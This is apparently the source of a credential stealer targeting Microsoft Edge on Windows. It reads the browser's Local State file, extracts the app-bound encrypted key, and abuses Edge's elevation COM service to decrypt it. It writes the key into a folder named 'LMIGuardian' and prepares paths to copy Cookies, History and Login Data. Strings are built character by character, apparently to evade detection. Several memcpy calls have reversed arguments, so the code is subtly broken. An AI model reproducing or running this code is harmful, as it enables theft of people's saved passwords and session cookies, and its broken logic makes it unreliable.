#include <Windows.h>
#include <Shlobj.h>
#include <Shlobj_core.h>
#include "Common.h"

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl
{
    // IUnknown (vtable slots 0-2)
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevatorEdge* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevatorEdge* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevatorEdge* This);

    // Edge base interface placeholders (vtable slots 3-5)
    HRESULT(STDMETHODCALLTYPE* _Placeholder1)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder2)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder3)(IElevatorEdge* This);

    // IElevator methods (vtable slots 6-8)
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevatorEdge* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevatorEdge* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevatorEdge* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorEdgeVtbl;

struct IElevatorEdge
{
    IElevatorEdgeVtbl* lpVtbl;
};

#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct tagPROCESSENTRY32W
{
    DWORD   dwSize;
    DWORD   cntUsage;
    DWORD   th32ProcessID;          // this process
    ULONG_PTR th32DefaultHeapID;
    DWORD   th32ModuleID;           // associated exe
    DWORD   cntThreads;
    DWORD   th32ParentProcessID;    // this process's parent process
    LONG    pcPriClassBase;         // Base priority of process's threads
    DWORD   dwFlags;
    WCHAR   szExeFile[MAX_PATH];    // Path
} PROCESSENTRY32W;
typedef PROCESSENTRY32W* PPROCESSENTRY32W;
typedef PROCESSENTRY32W* LPPROCESSENTRY32W;

#define TH32CS_SNAPPROCESS  0x00000002
#define ProcessHandleInformation 51
#define ObjectTypeInformation 2
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#define STATUS_BUFFER_TOO_SMALL    ((NTSTATUS)0xC0000023)



int main() {
    CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
    IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
    IElevatorEdge* pElevatorEdge = NULL;
    HRESULT hr;
    typedef HRESULT(WINAPI* _SHGetFolderPathA)(
        HWND   hwnd,
        int    csidl,
        HANDLE hToken,
        DWORD  dwFlags,
        LPSTR  pszPath
        );

    char path[MAX_PATH] = { 0 };
    if (SHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
        return 1;
    }

    char pathEdge[MAX_PATH] = { 0 };
    memcpy(path, pathEdge, MAX_PATH);
    char sSubEdge[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a', '\\',
        'D', 'e', 'f', 'a', 'u', 'l', 't',
        '\0'
    };

    memcpy(sSubEdge, pathEdge + strlen(pathEdge), MAX_PATH - strlen(pathEdge));

    char sLocalState[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a','\\',
        'L','o','c','a','l',' ','S','t','a','t','e',
        '\0'
    };
    int size = strlen(path);
    memcpy(sLocalState, path + strlen(path), MAX_PATH - strlen(path));

    char pathMal[MAX_PATH] = { 0 };
    if (SHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
        return 1;
    }
    char sMal[] = {
        '\\', 'L', 'M', 'I', 'G', 'u', 'a', 'r', 'd', 'i', 'a', 'n', '\0'
    };

    char keyPath[MAX_PATH] = { 0 };
    char cookiesPath[MAX_PATH] = { 0 };
    char historyPath[MAX_PATH] = { 0 };
    char passwordPath[MAX_PATH] = { 0 };

    memcpy(sMal, pathMal + strlen(pathMal), MAX_PATH - strlen(sMal));

    memcpy(pathMal, keyPath, MAX_PATH);
    char keyFileName[] = { '\\', 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '.', 'd', 'b', '\0' };
    memcpy(keyFileName, keyPath + strlen(keyPath), MAX_PATH - strlen(keyPath));

    memcpy(pathMal, cookiesPath, MAX_PATH);
    memcpy(pathMal, historyPath, MAX_PATH);
    memcpy(pathMal, passwordPath, MAX_PATH);
    char historyFilename[] = { '\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0' };
    char cookiesFilename[] = { '\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
    char passwordFilename[] = { '\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };

    memcpy(cookiesFilename, cookiesPath + strlen(cookiesPath), MAX_PATH - strlen(cookiesPath));
    memcpy(historyFilename, historyPath + strlen(historyPath), MAX_PATH - strlen(historyPath));
    memcpy(passwordFilename, passwordPath + strlen(passwordPath), MAX_PATH - strlen(passwordPath));

    char orCookiesPath[MAX_PATH] = { 0 };
    char orHistoryPath[MAX_PATH] = { 0 };
    char orPasswordPath[MAX_PATH] = { 0 };
    memcpy(pathEdge, orCookiesPath, MAX_PATH);
    memcpy(pathEdge, orHistoryPath, MAX_PATH);
    memcpy(pathEdge, orPasswordPath, MAX_PATH);

    char network[] = { '\\', 'N', 'e', 't', 'w', 'o', 'r', 'k', '\0' };

    memcpy(network, orCookiesPath + strlen(orCookiesPath), MAX_PATH - strlen(orCookiesPath));
    memcpy(cookiesFilename, orCookiesPath + strlen(orCookiesPath), MAX_PATH - strlen(orCookiesPath));
    memcpy(historyFilename, orHistoryPath + strlen(orHistoryPath), MAX_PATH - strlen(orHistoryPath));
    memcpy(passwordFilename, orPasswordPath + strlen(orPasswordPath), MAX_PATH - strlen(orPasswordPath));

    typedef HANDLE(WINAPI* _CreateFileA)(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
        );

    HANDLE hFile = CreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) { return 1; }

    if (!GetFileSize) { return 1; }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0) { return 1; }

    LPVOID fileBuf = malloc(dwFileSize + 1);
    if (!fileBuf) {
        return 1;
    }

    if (!ReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
        return 1;
    }

    CloseHandle(hFile);
    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0' };
    char* keyPointer = strstr((char*)fileBuf, patternKey);
    if (!keyPointer) { return 1; }
    keyPointer = keyPointer + strlen(patternKey);
    int sizeKeyB64 = 0;
    for (int i = 0; ; i++) {
        if (keyPointer[i] == '"') {
            keyPointer[i] = '\0';
            break;
        }
        i++;
        sizeKeyB64++;
    }

    typedef HRESULT(WINAPI* _CoInitializeEx)(
        LPVOID pvReserved,
        DWORD  dwCoInit
        );

    hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return 1;
    }

    hr = CoCreateInstance(
        EdgeCLSID,
        nullptr,
        CLSCTX_LOCAL_SERVER,
        EdgeIID,
        reinterpret_cast<void**>(&pElevatorEdge)
    );

    if (FAILED(hr)) {
        CoUninitialize();
        return 1;
    }

    typedef HRESULT(WINAPI* _CoSetProxyBlanket)(
        IUnknown* pProxy,
        DWORD                    dwAuthnSvc,
        DWORD                    dwAuthzSvc,
        OLECHAR* pServerPrincName,
        DWORD                    dwAuthnLevel,
        DWORD                    dwImpLevel,
        RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
        DWORD                    dwCapabilities
        );


    hr = CoSetProxyBlanket(
        (IUnknown*)pElevatorEdge,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );

    BSTR decryptedDataBSTR = NULL;
    DWORD dwLastError = 0;
    int length = 0;
    char* encKey = Base64Decode(keyPointer, length);


    BSTR bstrEncKey = SysAllocStringByteLen(encKey + 4, length - 4);
    hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
    if (bstrEncKey) {
        SysFreeString(bstrEncKey);
    }

    if (FAILED(hr)) {
        return 1;
    }
    else {
        typedef BOOL(WINAPI* _WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        //Write key to file in desktop
        //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
        //memcpy(keyFileName, pathMal + strlen(pathMal), MAX_PATH - strlen(pathMal));
        HANDLE hFile = CreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(hFile, decryptedDataBSTR, SysStringByteLen(decryptedDataBSTR), NULL, NULL);

        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        //if (CreateCopyFile(orCookiesPath, cookiesPath)) {
        //    for (int i = 0; i < 1000; i++) {
        //        if (pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
        //            break;
        //        }
        //    }

        //    if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {

        //    }

        //    if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {

        //    }
        //}

        //if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
        //    //CreateCopyFile(cookiesFilename, cookiesPath);
        //}



        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        SysFreeString(decryptedDataBSTR);
        CloseHandle(hFile);
    }

    free(fileBuf);
    //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
    //typedef VOID(WINAPI* _ExitThread)(DWORD);
    //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
    //pExitThread(0);
}